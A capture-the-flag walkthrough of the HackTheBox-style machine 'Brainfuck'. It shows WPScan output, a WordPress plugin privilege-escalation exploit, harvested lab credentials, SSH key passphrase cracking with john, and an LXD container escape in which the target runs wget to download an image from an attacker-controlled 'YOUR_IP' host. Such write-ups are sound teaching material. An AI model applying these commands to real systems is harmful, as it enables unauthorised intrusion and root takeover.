 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/  
 |      - https://core.trac.wordpress.org/changeset/47638/  
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2  
 |      - https://hackerone.com/reports/179695  
 |  
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure  
 |     Fixed in: 4.7.20  
 |     References:  
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450  
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/  
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html  
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq  
 |      - https://core.trac.wordpress.org/changeset/50717/  
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs  
 |   
[+] WordPress theme in use: proficient  
 | Location: https://brainfuck.htb/wp-content/themes/proficient/  
 | Last Updated: 2021-04-13T00:00:00.000Z  
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt  
 | [!] The version is out of date, the latest version is 3.0.43  
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3  
 | Style Name: Proficient  
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...  
 | Author: Specia  
 | Author URI: https://speciatheme.com/  
 |  
 | Found By: Css Style In Homepage (Passive Detection)  
 |  
 | Version: 1.0.6 (80% confidence)  
 | Found By: Style (Passive Detection)  
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'  
 |   
[+] Enumerating Vulnerable Plugins (via Passive Methods)  
[+] Checking Plugin Versions (via Passive and Aggressive Methods)  
 |   
[i] Plugin(s) Identified:  
 |   
[+] wp-support-plus-responsive-ticket-system  
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/  
 | Last Updated: 2019-09-03T07:57:00.000Z  
 | [!] The version is out of date, the latest version is 9.1.2  
 |  
 | Found By: Urls In Homepage (Passive Detection)  
 |  
 | [!] 6 vulnerabilities identified:  
 |  
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection  
 |     Fixed in: 8.0.0  
 |     References:  
 |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757  
 |      - https://www.exploit-db.com/exploits/40939/  
 |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/  
 |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system  
 |  
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)  
 |     Fixed in: 8.0.8  
 |     References:  
 |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1  
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system  
 |  
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection  
 |     Fixed in: 9.0.3  
 |     References:  
 |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131  
 |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md  
 |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system  
 |  
 | [!] Title: WP Support Plus Responsive Ticket System < 9.1.2 - Stored XSS  
 |     Fixed in: 9.1.2  
 |     References:  
 |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299  
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331  
 |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/  
 |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system  
 |  
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation  
 |     Fixed in: 8.0.0  
 |     References:  
 |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f  
 |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html  
 |      - https://packetstormsecurity.com/files/140413/  
 |  
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution  
 |     Fixed in: 8.0.8  
 |     References:  
 |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f  
 |      - https://plugins.trac.wordpress.org/changeset/1763596  
 |  
 | Version: 7.1.3 (100% confidence)  
 | Found By: Readme - Stable Tag (Aggressive Detection)  
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt  
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)  
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt  
 |   
[+] Enumerating Users (via Passive and Aggressive Methods)  
 Brute Forcing Author IDs - Time: 00:00:02 <========================================================================================> (10 / 10) 100.00% Time: 00:00:02  
 |   
[i] User(s) Identified:  
 |   
[+] admin  
 | Found By: Author Posts - Display Name (Passive Detection)  
 | Confirmed By:  
 |  Rss Generator (Passive Detection)  
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)  
 |  Login Error Messages (Aggressive Detection)  
 |   
[+] administrator  
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  
 | Confirmed By: Login Error Messages (Aggressive Detection)  
 |   
[+] WPScan DB API OK  
 | Plan: free  
 | Requests Done (during the scan): 3  
 | Requests Remaining: 22  
 |   
[+] Finished: Sat May  1 20:16:49 2021  
[+] Requests Done: 63  
[+] Cached Requests: 6  
[+] Data Sent: 16.389 KB  
[+] Data Received: 278.816 KB  
[+] Memory used: 203.375 MB  
[+] Elapsed time: 00:00:56 

## Exploit  
Damm, there is a lot of vulns here, but let's start with the plugins. We found a lot in the WP Support Plus. Let's search exploit for it
searchsploit wp support plus  
![alt text](./img/brainfuck09.PNG?raw=true)  

Privilege Escalation? Let’s see…
searchsploit -x pgp/webapps/41006.txt  
![alt text](./img/brainfuck11.PNG?raw=true)  

Hummm, so let’s copy this code and make some modifications  
![alt text](./img/brainfuck12.PNG?raw=true)  
  
Here we change the URL, the username (we found admin with wpscan) and the e-mail (is in the main page of brainfuck.htb)  
![alt text](./img/brainfuck13.PNG?raw=true)  

Now let’s access the exploit.html in our browser. You can use the command “firefox exploit.html” or in your browser go to the menu FILE - OPEN FILE  
![alt text](./img/brainfuck14.PNG?raw=true)  

A blank page will open, just return to brainfuck,htb and you will be ADMIN  
![alt text](./img/brainfuck15.PNG?raw=true)  

Now let’s go to DASHBOARD  
![alt text](./img/brainfuck16.PNG?raw=true)  

And now to PLUGINS  
![alt text](./img/brainfuck17.PNG?raw=true)  

Let’s see the EASY WP SMTP settings, probably there is an user an pass to send the e-mail  
![alt text](./img/brainfuck18.PNG?raw=true)  

There is an PASSWORD here, but is hidded. Lets found it inspecting the element  
![alt text](./img/brainfuck19.PNG?raw=true)  

![alt text](./img/brainfuck20.PNG?raw=true)  

TOUCHE - Credential orestis:kHGuERB29DNiNE

With this password we can see the e-mails on SMTP  
![alt text](./img/brainfuck21.PNG?raw=true)  

Listing we found 2 e-mails, let’s read then…  
![alt text](./img/brainfuck22.PNG?raw=true)  
  
![alt text](./img/brainfuck23.PNG?raw=true)  
  
![alt text](./img/brainfuck24.PNG?raw=true)  

Credentia orestis:kIEnnfEKJ#9UmdO

Ok, here we have the password. Let’s try connect to SSH  
![alt text](./img/brainfuck25.PNG?raw=true)  
  
#sad, ok looking our enumeration we have the https://sup3rs3cr3t.brainfuck.htb/ page. Let’s try it  
![alt text](./img/brainfuck26.PNG?raw=true)  
  
![alt text](./img/brainfuck27.PNG?raw=true)  
  
SUCCESS!

Let’s open this 3 messages:  
![alt text](./img/brainfuck28.PNG?raw=true)  
  
![alt text](./img/brainfuck29.PNG?raw=true)  
  
![alt text](./img/brainfuck30.PNG?raw=true)  

Ok, looks like 1 is useless, 1 is a conversation because ORESTIS gets looked out and the other is encrypted  
One of the main cyphers used is the VIGENERE cypher. To decoded without an passphrase we can usethis website: http://rumkin.com/tools/cipher/vigenere.php  
![alt text](./img/brainfuck31.PNG?raw=true)  

Here we will try to find the passphrase doing the reverse. By looking the ORESTIS messages we know he have a signature “Orestis - Hacking for fun and profit”. So in ALL his encrypted messages this text will appear in the end. So:

Pieagnm - Jkoijeg nbw zwx mle grwsnn -------- is equal to --------- Orestis - Hacking for fun and profit

We can put this information in the website  
![alt text](./img/brainfuck32.PNG?raw=true)  

Ok, we can see the words BRAIN FUCK MY. Let’s to remove the spaces in the message and passphrase  
![alt text](./img/brainfuck33.PNG?raw=true)  
  
Orestis REALLY need some help…… but we found the passphrase “fuckmybrain”
Let’s now copy the encrypted message with an URL and decode it  
![alt text](./img/brainfuck34.PNG?raw=true)  

YAY, now we have de id_rsa
wget  https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate  
![alt text](./img/brainfuck35.PNG?raw=true)  
  
![alt text](./img/brainfuck36.PNG?raw=true)  
  
…...it’s encrypted too. Ok, so we need to break this
/usr/share/john/ssh2john.py id_rsa > hash.txt  
![alt text](./img/brainfuck37.PNG?raw=true)  

john hash.txt --wordlist=~/wordlists/rockyou.txt  
![alt text](./img/brainfuck38.PNG?raw=true)  

id_rsa passphrase 3poulakia!

ssh orestis@10.10.10.17 -i id_rsa  
![alt text](./img/brainfuck39.PNG?raw=true)  
  
HABEMUS SHELL \o/

![alt text](./img/brainfuck43.PNG?raw=true)  

## Privesc  
![alt text](./img/brainfuck40.PNG?raw=true)  

lxd? We can try to escalate our privileges with the instructions in this [link](https://www.hackingarticles.in/lxd-privilege-escalation/)

> In your machine:  
git clone https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
./build-alpine  
check the name of the created file  
sudo python3 -m http.server 80  

> On target machine  
cd /tmp  
wget http://YOUR_IP/CREATED_ALPINE_FILE  
lxc image import ./CREATED_ALPINE_FILE --alias myimage  
lxc image list  
lxc init myimage ignite -c security.privileged=true  
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
lxc start ignite  
lxc exec ignite /bin/sh  
id  
![alt text](./img/brainfuck41.PNG?raw=true)  

To read the flag go to /mnt/root/root  
![alt text](./img/brainfuck42.PNG?raw=true)  
